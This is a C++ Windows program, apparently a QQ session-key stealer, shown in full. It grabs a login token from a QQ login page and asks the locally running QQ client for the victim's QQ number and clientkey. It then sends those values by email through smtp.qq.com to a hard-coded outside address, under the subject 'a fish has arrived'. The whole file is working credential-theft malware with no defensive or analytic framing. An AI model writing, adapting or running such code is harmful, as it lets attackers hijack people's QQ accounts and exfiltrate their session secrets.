#define _CRT_SECURE_NO_WARNINGS 1
#include"email/CSendMail.h"
#include <string>
#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <WinInet.h>
#include <string>
#include <random>
#include <chrono>
#include <thread>
#pragma comment(lib,"wininet.lib")
using namespace std;
struct info
{
    string token;
    string account;
    string qqkey;
};
std::string GenerateRandomString(int n)
{
    std::string szRand2;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(0, 1);

    for (int j = 0; j < n; j++)
    {
        char randChar;
        switch (dis(gen))
        {
        case 1:
            randChar = static_cast<char>(rand() % 5 + 48);
            break;
        default:
            randChar = static_cast<char>(rand() % 5 + 53);
        }
        szRand2 += randChar;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    return szRand2;
}
BOOL DelTempFiles()
{
    BOOL bResult = FALSE;
    BOOL bDone = FALSE;

    LPINTERNET_CACHE_ENTRY_INFO lpCacheEntry = NULL;

    DWORD  dwTrySize, dwEntrySize = 4096; 
    HANDLE hCacheDir = NULL;
    DWORD  dwError = ERROR_INSUFFICIENT_BUFFER;

    do
    {
        switch (dwError)
        {
  
        case ERROR_INSUFFICIENT_BUFFER:
            delete[] lpCacheEntry;
            lpCacheEntry = (LPINTERNET_CACHE_ENTRY_INFO) new char[dwEntrySize];
            lpCacheEntry->dwStructSize = dwEntrySize;
            dwTrySize = dwEntrySize;
            BOOL bSuccess;
            if (hCacheDir == NULL)

                bSuccess = (hCacheDir
                    = FindFirstUrlCacheEntry(NULL, lpCacheEntry,
                        &dwTrySize)) != NULL;
            else
                bSuccess = FindNextUrlCacheEntry(hCacheDir, lpCacheEntry, &dwTrySize);

            if (bSuccess)
                dwError = ERROR_SUCCESS;
            else
            {
                dwError = GetLastError();
                dwEntrySize = dwTrySize;
            }
            break;

          
        case ERROR_NO_MORE_ITEMS:
            bDone = TRUE;
            bResult = TRUE;
            break;

         
        case ERROR_SUCCESS:

           
            if (!(lpCacheEntry->CacheEntryType & COOKIE_CACHE_ENTRY))

                DeleteUrlCacheEntry(lpCacheEntry->lpszSourceUrlName);

        
            dwTrySize = dwEntrySize;
            if (FindNextUrlCacheEntry(hCacheDir, lpCacheEntry, &dwTrySize))
                dwError = ERROR_SUCCESS;

            else
            {
                dwError = GetLastError();
                dwEntrySize = dwTrySize; 
            }
            break;

         
        default:
            bDone = TRUE;
            break;
        }

        if (bDone)
        {
            delete[]lpCacheEntry;
            if (hCacheDir)
                FindCloseUrlCache(hCacheDir);
        }
    } while (!bDone);

    return TRUE;
}
void findValueInJS(const char* jsCode, const char* key, char* value, int maxSize) {
    std::string code(jsCode);
    std::string searchKey(key);
    std::string result;

    std::size_t keyPos = code.find(searchKey);
    if (keyPos != std::string::npos) {
        std::size_t valueStartPos = code.find(':', keyPos);
        if (valueStartPos != std::string::npos) {
            valueStartPos = code.find_first_not_of(" \t\n\r\f\v", valueStartPos + 1);
            if (valueStartPos != std::string::npos && (code[valueStartPos] == '"' || code[valueStartPos] == '\'')) {
                std::size_t valueEndPos = code.find(code[valueStartPos], valueStartPos + 1);
                if (valueEndPos != std::string::npos) {
                    result = code.substr(valueStartPos + 1, valueEndPos - valueStartPos - 1);
                }
            }
            else {
                valueStartPos = code.find_first_not_of(" \t\n\r\f\v", valueStartPos);
                std::size_t valueEndPos = code.find_first_of(",};", valueStartPos);
                if (valueEndPos != std::string::npos) {
                    result = code.substr(valueStartPos, valueEndPos - valueStartPos);
                }
            }
        }
    }

    // 将结果复制到指定的 char 数组中
    strncpy(value, result.c_str(), maxSize - 1);
    value[maxSize - 1] = '\0';
}
int main()
{
    info email;
    // 清理缓存
    DelTempFiles();
    // 初始化URL
    URL_COMPONENTSA crackedURL = { 0 };

    char URL_STRING[] = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=636014201&s_url=http://www.qq.com/qq2012/loginSuccess.htm&style=20&border_radius=1&target=self&maskOpacity=40";

    char szHostName[128];
    char szUrlPath[256];
    crackedURL.dwStructSize = sizeof(URL_COMPONENTSA);
    crackedURL.lpszHostName = szHostName;
    crackedURL.dwHostNameLength = ARRAYSIZE(szHostName);
    crackedURL.lpszUrlPath = szUrlPath;
    crackedURL.dwUrlPathLength = ARRAYSIZE(szUrlPath);
    InternetCrackUrlA(URL_STRING, (DWORD)strlen(URL_STRING), 0, &crackedURL);

    // 初始化会话
    HINTERNET hInternet = InternetOpenA("Microsoft Internet Explorer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hHttpSession = InternetConnectA(hInternet, crackedURL.lpszHostName, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", crackedURL.lpszUrlPath, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);

    // 发送HTTP请求
    HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0);

    // 查询HTTP请求状态
    DWORD dwRetCode = 0;
    DWORD dwSizeOfRq = sizeof(DWORD);
    BOOL bRet = FALSE;
    bRet = HttpQueryInfo(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);

    // 读取整个Headers
    char lpHeaderBuffer[1024] = { 0 };
    dwSizeOfRq = 1024;
    bRet = HttpQueryInfo(hHttpRequest, HTTP_QUERY_RAW_HEADERS, lpHeaderBuffer, &dwSizeOfRq, NULL);

    // 从Cookie中提取pt_local_token的值
    char* pt_local_token = lpHeaderBuffer + dwSizeOfRq;
    while (pt_local_token != lpHeaderBuffer)
    {
        if (strstr(pt_local_token, "pt_local_token="))
        {
            // 退出之前，修正偏移
            pt_local_token += sizeof("pt_local_token");
            char* pEndBuffer = strstr(pt_local_token, ";");
            *pEndBuffer = 0;
            break;
        }
        pt_local_token--;
    }

    //cout << "[+] Token:" << pt_local_token << endl;
    email.token = pt_local_token;
    // 关闭时按相反的顺序
    InternetCloseHandle(hHttpRequest);
    InternetCloseHandle(hHttpSession);


    time_t seed = time(NULL);
    srand((unsigned)seed);

    // 初始化URL参数
    char lpszUrlPath[MAX_PATH] = { 0 };
    string randnum = GenerateRandomString(16).c_str();
    strcat_s(lpszUrlPath, "/pt_get_uins?callback=ptui_getuins_CB&r=0.");
    strcat_s(lpszUrlPath, randnum.c_str());            // 追加16位随机数
    strcat_s(lpszUrlPath, "&pt_local_tk=");
    strcat_s(lpszUrlPath, pt_local_token);    // 追加pt_local_token

   // cout << "[+] URLPath:" << lpszUrlPath << endl;

    // 初始化会话
    hHttpSession = InternetConnectA(hInternet, "localhost.ptlogin2.qq.com", 4301, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", lpszUrlPath, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);

    // 发送HTTP请求,添加头信息
    const char* lpHeaders = "Referer:https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=636014201&s_url=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm";
    HttpSendRequestA(hHttpRequest, lpHeaders, strlen(lpHeaders), NULL, 0);

    // 查询HTTP请求状态
    dwRetCode = 0;
    dwSizeOfRq = sizeof(DWORD);
    bRet = HttpQueryInfo(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);

    // 获取返回数据的大小
    DWORD dwNumberOfBytesAvailable = 0;
    bRet = InternetQueryDataAvailable(hHttpRequest, &dwNumberOfBytesAvailable, NULL, NULL);

    // 读取网页内容
    char* lpBuffer = new char[dwNumberOfBytesAvailable]();
    bRet = InternetReadFile(hHttpRequest, lpBuffer, dwNumberOfBytesAvailable, &dwNumberOfBytesAvailable);

    // 获取返回数据并提取uin（QQ号）
    cout << lpBuffer << endl;
    char uin[32] = { 0 };
    findValueInJS(lpBuffer, "account", uin, sizeof(uin));
   // cout << "[+] uin:" << uin << endl;
    email.account = uin;
    // 释放资源,注意关闭句柄时按相反的顺序
    InternetCloseHandle(hHttpRequest);
    InternetCloseHandle(hHttpSession);

    /* 第三次会话 */

    // 初始化URL参数
    ZeroMemory(lpszUrlPath, MAX_PATH);
    strcat_s(lpszUrlPath, "/pt_get_st?clientuin=");
    strcat_s(lpszUrlPath, uin);
    strcat_s(lpszUrlPath, "&callback=ptui_getst_CB&pt_local_tk=");
    strcat_s(lpszUrlPath, pt_local_token);

    // 发送HTTPS请求
    hHttpSession = InternetConnectA(hInternet, "localhost.ptlogin2.qq.com", 4301, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", lpszUrlPath, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);

    // 添加头信息
    lpHeaders = "Referer:https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=636014201&s_url=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm";
    HttpSendRequestA(hHttpRequest, lpHeaders, strlen(lpHeaders), NULL, 0);

    // 查询HTTP请求状态
    dwRetCode = 0;
    dwSizeOfRq = sizeof(DWORD);
    bRet = HttpQueryInfoA(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);

    // 读取整个Headers
    ZeroMemory(lpHeaderBuffer, 1024);
    dwSizeOfRq = 1024;
    bRet = HttpQueryInfoA(hHttpRequest, HTTP_QUERY_RAW_HEADERS, lpHeaderBuffer, &dwSizeOfRq, NULL);

    // 从Cookie中提取ClientKey的值
    char* clientkey = lpHeaderBuffer + dwSizeOfRq;
    while (clientkey != lpHeaderBuffer)
    {
        if (strstr(clientkey, "clientkey="))
        {
            // 退出之前，修正偏移
            clientkey += sizeof("clientkey");
            char* pEndBuffer = strstr(clientkey, ";");
            *pEndBuffer = 0;
            break;
        }
        clientkey--;
    }

    //cout << "[+] client key:" << clientkey << endl;
    InternetCloseHandle(hHttpRequest);
    InternetCloseHandle(hHttpSession);
    InternetCloseHandle(hInternet);
    delete[] lpBuffer;
    CSendMail sMailer;
    email.qqkey = clientkey;
    sMailer.setServerName("smtp.qq.com");                                                        //邮箱smtp 对应就要填对163就163 qq就qq
    sMailer.setUserName("114514@qq.com");                                                                //邮箱账号名
    sMailer.setUserPwd("PASSWORD");                                                                //邮箱密码
    sMailer.setSenderName("发件人姓名");                                                                //发件人名字
    sMailer.setSenderAddress("114514@qq.com");                                                //发送邮箱地址，填你账号的地址 ,必须要与前面对应，否则会发信失败
    sMailer.addReceiver("收件人姓名", "1919810@qq.com");//收件人姓名和账号
    if (sMailer.Connent())                                                                      
    {
       string title = "有鱼来了";
 
       string content = "QQ:" +email.account + "\nToken:" + email.token + "\nQQkey:" + email.qqkey;
        if (sMailer.SendMail(title, content))                                                 
            cout << "完成！";
    }
    return 0;
}